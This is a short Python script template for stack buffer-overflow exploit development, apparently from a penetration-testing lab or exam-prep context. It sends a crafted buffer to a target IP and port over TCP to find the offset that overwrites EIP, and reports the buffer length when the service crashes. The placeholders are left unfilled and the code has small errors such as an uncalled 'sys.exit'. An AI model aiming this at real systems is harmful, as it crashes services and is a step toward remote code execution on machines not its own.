#!/usr/bin/python

import sys,socket
from time import sleep

buffer = #Based on at what bytes you get to EIP, generate your pattern and insert it here, example "AAAA"
RHOST = #IP address of the target machine, example: "10.10.10.0"
RPORT = #Port number of the target machine, example: 21

try:
    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect((RHOST,RPORT))
    s.send(buffer + "\r\n")
    s.close()
except:
    print("Debugger crashed at %s bytes" % str(len(buffer)))
    sys.exit
